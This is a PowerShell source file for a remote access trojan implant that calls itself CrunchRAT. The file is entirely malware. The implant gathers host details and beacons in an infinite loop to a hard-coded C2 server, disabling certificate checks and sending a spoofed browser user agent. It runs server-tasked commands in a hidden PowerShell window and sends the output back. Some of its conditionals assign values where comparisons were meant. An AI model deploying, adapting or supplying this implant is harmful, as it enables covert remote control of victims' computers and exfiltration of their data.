# **** START CONFIGURATION ****

    # Server address
    $ServerAddress = "192.168.1.217"

    # Beacon interval (in seconds)
    $Interval = 10

    # Beacon filename
    $BeaconFilename = "beacon.php"

    # Update filename
    $UpdateFilename = "update.php"

    # Beacon URL
    $BeaconURL = "https://" + $ServerAddress + "/" + $BeaconFilename

    # Update URL
    $UpdateURL = "https://" + $ServerAddress + "/" + $UpdateFilename

    # User Agent used for beacon and update requests
    $UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"

# **** END CONFIGURATION ****



# The GetSystemInfo() function will get information on the implanted system
# This function will return strings that contain system information (hostname, architecture, etc)
function GetSystemInfo()
{
    # Gets the system's hostname
    $Hostname = [System.Environment]::MachineName

    # Gets current process ID
    $ProcessID = $pid

    # Gets the current process filename
    $ProcessFilename = Get-Process -Id $pid | Select-Object -ExpandProperty ProcessName

    # Gets the system drive (usually C:)
    $SystemDrive = Get-PSDrive C | Select-Object -ExpandProperty Root

    # Determines if the OS is 32-bit or 64-bit based on the presence of the "C:\Windows\SysWow64" directory
    $FullPath = $SystemDrive + "Windows\SysWow64"
    $Is64Bit = Test-Path $FullPath

    # If 64-bit OS
    # Gets OS value from the Registry
    If ($Is64Bit = "True")
    {
        $Architecture = "x64"
        $Os = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion" -Name ProductName | Select-Object -ExpandProperty ProductName
    }
    # Else 32-bit OS
    # Gets OS value from the Registry (different Registry key)
    Else
    {
        $Architecture = "x86"
        $Os = Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName | Select-Object -ExpandProperty ProductName
    }

    # Returns strings containing system information
    Return $Hostname, $ProcessID, $ProcessFilename, $Architecture, $Os
}
# End of GetSystemInfo() function



# The Beacon() function will beacon to the specified C2 server
# This function will return a task string if something is tasked for this host
function Beacon($BeaconURL, $UserAgent, $Hostname, $Os, $Architecture, $Interval, $ProcessID, $ProcessFilename)
{
    # Tries to beacon
    Try
    {
        # Ignores SSL certificate errors
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}

        # POST parameters
        $Parameters = @{hostname=$Hostname;os=$Os;architecture=$Architecture;interval=$Interval;pid=$ProcessID;pfilename=$ProcessFilename}
    
        # Beacon request
        $BeaconRequest = Invoke-WebRequest -Uri $BeaconURL -Method POST -UserAgent $UserAgent -Body $Parameters
    
        # Saves beacon response
        $BeaconResponse = $BeaconRequest | Select-Object -ExpandProperty Content

        # Returns beacon response to the calling function
        Return $BeaconResponse
    }
    # TODO: Research into if there's a better way to "Try" without a blank "Catch"
    Catch
    {
    }
}
# End of Beacon() function



# The ParseTask() function will parse out task information from a beacon response
# Returns task ID, task action, and task secondary
function ParseTask($BeaconResponse)
{
    # Gets just the task ID
    $Pattern = '(?i)<id[^>]*>(.*)</id>'
    $TaskID = [Regex]::Matches($BeaconResponse, $Pattern) | ForEach { $_.Groups[1].Value }
    
    # Gets just the task action
    $Pattern = '(?i)<action[^>]*>(.*)</action>'
    $TaskAction = [Regex]::Matches($BeaconResponse, $Pattern) | ForEach { $_.Groups[1].Value }

    # Gets just the task secondary
    $Pattern = '(?i)<secondary[^>]*>(.*)</secondary>'
    $TaskSecondary = [Regex]::Matches($BeaconResponse, $Pattern)  | ForEach { $_.Groups[1].Value }

    Return $TaskID, $TaskAction, $TaskSecondary
}
# End of ParseTask() function



# The ExecuteCommand() function will execute the tasked command under the context of powershell.exe
# Some RATs use "cmd.exe /c COMMAND" which is super janky
# Returns Standard Output or Standard Error (if applicable)
function ExecuteCommand($TaskSecondary)
{
    # Creates a new process object
    $Process = New-Object System.Diagnostics.Process
    $Process.StartInfo.FileName = "powershell.exe"
    $Process.StartInfo.Arguments = $TaskSecondary

    # Does not create a new window
    $Process.StartInfo.UseShellExecute = $False
    $Process.StartInfo.CreateNoWindow = $True

    # Captures Standard Output
    $Process.StartInfo.RedirectStandardOutput = $True

    # Captures Standard Error
    $Process.StartInfo.RedirectStandardError = $True

    # Displays "True" to console if not sent to Out-Null
    $Process.Start() | Out-Null

    # Saves Standard Output and Standard Error (if applicable)
    $CommandOutput = $Process.StandardOutput.ReadToEnd()
    $CommandError = $Process.StandardError.ReadToEnd()

    # If output is greater than 65,535 characters
    # MySQL TEXT limits us to 65,535 characters
    If ($CommandOutput)
    {
       If ($CommandOutput.Length -gt 65535)
       {
            $CrunchError = "CrunchRAT Error: Output exceeds the 65,535 character limit imposed by MySQL"
            Return $CrunchError
       }
       Else
       {
            Return $CommandOutput
       }
    }
    # Else if error is greater than 65,535 characters
    # MySQL TEXT limits us to 65,535 characters
    ElseIf ($CommandError)
    {
        If ($CommandError.Length -gt 65535)
        {
            $CrunchError = "CrunchRAT Error: Output exceeds the 65,535 character limit imposed by MySQL"
            Return $CrunchError
        }
        Else
        {
            Return $CommandError
        }
    }  
}
# End of ExecuteCommand() function



# The CommandUpdate() function will update task command output to the C2 server
# Code modified from: http://stackoverflow.com/questions/17325293/invoke-webrequest-post-with-parameters
# Does not return anything
function CommandUpdate($UpdateURL, $UserAgent, $TaskID, $TaskAction, $TaskSecondary, $CommandOutput)
{
    # Tries to update command output
    Try
    {
        # Ignores SSL certificate errors
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

        # POST parameters
        $Parameters = @{id=$TaskID;action=$TaskAction;secondary=$TaskSecondary;output=$CommandOutput}
    
        # Update request
        $UpdateRequest = Invoke-WebRequest -Uri $UpdateURL -UserAgent $UserAgent -Method POST -Body $Parameters 
    }
    Catch
    {
    }
}
# End of CommandUpdate() function



# The Main() function is the program's entry point
Function Main()
{
    # Gets system information from GetSystemInfo() function
    $Hostname, $ProcessID, $ProcessFilename, $Architecture, $Os = GetSystemInfo

    # Infinite loop
    While ($True)
    {
        # Beacons
        $BeaconResponse = Beacon $BeaconURL $UserAgent $Hostname $Os $Architecture $Interval $ProcessID $ProcessFilename
    
        # If we received a beacon response (we have something tasked)
        If ($BeaconResponse)
        {
            # Parses out task information
            $TaskID, $TaskAction, $TaskSecondary = ParseTask $BeaconResponse

            # If "command" action
            If ($TaskAction = "command")
            {
                # Executes command
                $CommandOutput = ExecuteCommand $TaskSecondary

                # Updates
                CommandUpdate $UpdateURL $UserAgent $TaskID $TaskAction $TaskSecondary $CommandOutput
            }
        }

        # Sleeps for the specified interval
        Start-Sleep -s $Interval
    }
}
# End of Main() function

# Program entry point
Main